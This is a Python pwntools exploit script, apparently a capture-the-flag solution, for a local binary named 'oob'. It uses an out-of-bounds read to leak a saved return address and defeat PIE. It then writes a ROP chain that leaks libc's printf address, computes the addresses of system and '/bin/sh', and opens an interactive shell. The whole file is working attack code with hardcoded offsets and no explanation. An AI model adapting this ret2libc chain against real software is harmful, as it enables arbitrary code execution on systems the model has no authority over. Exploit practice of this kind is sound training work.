from pwn import *

p = process('./oob')
e = ELF('./oob')

def isi(i, ch):
	p.sendline('i')
	p.sendline(str(i))
	p.sendline(ch)
	p.recvuntil('filled\n')

def baca(i):
	p.sendline('r')
	p.sendline(str(i))
	p.recvuntil('is ')
	leaked = chr(eval(p.recvline()[:-1]) & 0xff) # Get two last hex
	return leaked

saved_rip_addr 	= 0x7fffffffde98
buff_addr	 	= 0x7fffffffde7e
offset_rip		= 0x12ad		# LOOK AT GDB 4 last saved rip hex - 0x4000
base_pie		= ''
distance		= saved_rip_addr - buff_addr

print 'distance =',distance

for i in range(distance, distance+8):
	base_pie += baca(i)

print base_pie
base_pie = u64(base_pie)
base_pie -= offset_rip

log.info("Base PIE\t: 0x{0:x}".format(base_pie))


gotprintf = p64(e.got['printf'] + base_pie)
puts = p64(e.symbols['puts'] + base_pie)
main = p64(e.symbols['main'] + base_pie)
poprdi = p64(0x0000000000001323 + base_pie)
poprsir15 = p64(0x0000000000001321 + base_pie)
payload = poprdi + gotprintf + puts + main # Leak Libc printf address

log.info('Leaking libc')

print 'payload = '+repr(payload)
for i,pp in enumerate(payload):
	isi(i+distance, pp)


# Get Libc printf address
p.sendline('x')
printf = p.recvline()
printf_addr =  u64(printf[:-1]+'\x00\x00')

# GET libc with ./find <printf libc>
log.info('Printf libc\t: 0x{0:x}'.format(printf_addr))

# ./dump <libc id>
# ./dump <libc id> printf
offset_system =	0x0000000000045380
offset_printf = 0x00000000000593a0
offset_binsh  = 0x184519

libc_base = printf_addr - offset_printf
system_addr = libc_base + offset_system
binsh_addr = libc_base + offset_binsh

# Gaining shell
payload = poprdi + p64(binsh_addr) + p64(system_addr)

log.info('Gaining shell')

for i,pp in enumerate(payload):
	isi(i+distance, pp)

p.sendline('x')
p.interactive()

